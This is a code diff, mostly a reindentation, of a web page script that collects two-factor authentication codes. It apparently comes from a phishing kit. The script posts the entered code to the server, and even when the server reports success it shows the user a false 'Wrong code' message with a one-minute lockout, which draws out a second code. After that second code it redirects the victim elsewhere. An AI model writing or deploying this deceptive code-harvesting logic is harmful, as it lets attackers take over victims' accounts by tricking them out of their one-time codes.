@@ -52,99 +52,95 @@
       <!-- Your HTML content -->
       
       <script>
-  $(document).ready(function () {
-  var attempts = 0; // Track the number of attempts
-
-  // Function to handle two-factor authentication submission
-  function submitTwoFactor() {
-    attempts++;
-
-    // Disable the input field and the continue button
-    $('input[name="twofactory"]').prop('disabled', true);
-    $('.btn-primary').prop('disabled', true);
-
-    var twoFactorCode = $('input[name="twofactory"]').val();
-
-    $.ajax({
-      type: 'POST',
-      url: '/submit-two-factor',
-      data: { twofactory: twoFactorCode },
-      success: function (response) {
-        console.log('Two-factor authentication successful:', response);
-        // Handle success (e.g., redirect or show a success message)
-
-        if (attempts === 2) {
-          // Redirect after the second attempt
-          window.location.href = 'find'; // Replace with your actual redirect URL
-        } else {
-          // Display a countdown timer and a message
-          displayCountdown();
-
-          // Clear the input field after one minute
-          setTimeout(function () {
-            $('input[name="twofactory"]').val('');
-            // Enable the input field and the continue button
-            $('input[name="twofactory"]').prop('disabled', false);
-            $('.btn-primary').prop('disabled', false);
-          }, 60000); // 60,000 milliseconds = 1 minute
-        }
-      },
-      error: function (error) {
-        console.error('Two-factor authentication failed:', error);
-        // Handle error (e.g., show an error message)
-
-        // Enable the input field and the continue button immediately
-        $('input[name="twofactory"]').prop('disabled', false);
-        $('.btn-primary').prop('disabled', false);
-      }
-    });
-  }
-
-  // Event listener for the "Continue" button
-  $('.btn-primary').on('click', function (e) {
-    e.preventDefault(); // Prevent the default form submission
-
-    // Call the function to submit the two-factor authentication code
-    submitTwoFactor();
-  });
-
-  // Function to display countdown timer and message
-  function displayCountdown() {
-    var countdown = 60; // Countdown duration in seconds
-    var countdownInterval = setInterval(function () {
-      $('.countdown-timer').text('Wrong code ' + countdown + ' seconds before submitting again.');
-      countdown--;
-      if (countdown < 0) {
-        clearInterval(countdownInterval);
-        $('.countdown-timer').text('');
-      }
-    }, 1000); // Update every 1 second
-  }
-});
-
-
-
-
-function validateNumberInput(input) {
-  // Remove non-numeric characters using a regular expression
-  input.value = input.value.replace(/\D/g, '');
-
-  // You can also limit the length of the input if needed
-  if (input.value.length > 6) {
-    input.value = input.value.slice(0, 6);
-  }
-
-  // Display an error message if non-numeric characters are entered
-  var errorMessage = document.getElementById("error-message");
-  if (/[^0-9]/.test(input.value)) {
-    errorMessage.textContent = "Please enter only numbers.";
-  } else {
-    errorMessage.textContent = "";
-  }
-}
-
-
-      </script>
+        $(document).ready(function () {
+          var attempts = 0; // Track the number of attempts
+        
+          // Function to handle two-factor authentication submission
+          function submitTwoFactor() {
+            attempts++;
+        
+            // Disable the input field and the continue button
+            $('input[name="twofactory"]').prop('disabled', true);
+            $('.btn-primary').prop('disabled', true);
+        
+            var twoFactorCode = $('input[name="twofactory"]').val();
+        
+            $.ajax({
+              type: 'POST',
+              url: '/submit-two-factor',
+              data: { twofactory: twoFactorCode },
+              success: function (response) {
+                console.log('Two-factor authentication successful:', response);
+        
+                // Handle success (e.g., redirect or show a success message)
+                if (attempts === 2) {
+                  // Redirect after the second attempt
+                  window.location.href = 'find'; // Replace with your actual redirect URL
+                } else {
+                  // Display a countdown timer and a message
+                  displayCountdown();
+        
+                  // Clear the input field after one minute
+                  setTimeout(function () {
+                    $('input[name="twofactory"]').val('');
+                    // Enable the input field and the continue button
+                    $('input[name="twofactory"]').prop('disabled', false);
+                    $('.btn-primary').prop('disabled', false);
+                  }, 60000); // 60,000 milliseconds = 1 minute
+                }
+              },
+              error: function (error) {
+                console.error('Two-factor authentication failed:', error);
+        
+                // Handle error (e.g., show an error message)
+        
+                // Enable the input field and the continue button immediately
+                $('input[name="twofactory"]').prop('disabled', false);
+                $('.btn-primary').prop('disabled', false);
+              }
+            });
+          }
+        
+          // Event listener for the "Continue" button
+          $('.btn-primary').on('click', function (e) {
+            e.preventDefault(); // Prevent the default form submission
+        
+            // Call the function to submit the two-factor authentication code
+            submitTwoFactor();
+          });
+        
+          // Function to display countdown timer and message
+          function displayCountdown() {
+            var countdown = 60; // Countdown duration in seconds
+            var countdownInterval = setInterval(function () {
+              $('.countdown-timer').text('Wrong code ' + countdown + ' seconds before submitting again.');
+              countdown--;
+              if (countdown < 0) {
+                clearInterval(countdownInterval);
+                $('.countdown-timer').text('');
+              }
+            }, 1000); // Update every 1 second
+          }
+        
+          function validateNumberInput(input) {
+            // Remove non-numeric characters using a regular expression
+            input.value = input.value.replace(/\D/g, '');
+        
+            // You can also limit the length of the input if needed
+            if (input.value.length > 6) {
+              input.value = input.value.slice(0, 6);
+            }
+        
+            // Display an error message if non-numeric characters are entered
+            var errorMessage = document.getElementById("error-message");
+            if (/[^0-9]/.test(input.value)) {
+              errorMessage.textContent = "Please enter only numbers.";
+            } else {
+              errorMessage.textContent = "";
+            }
+          }
+        });
+        </script>
 <!-- Modal -->
 
 
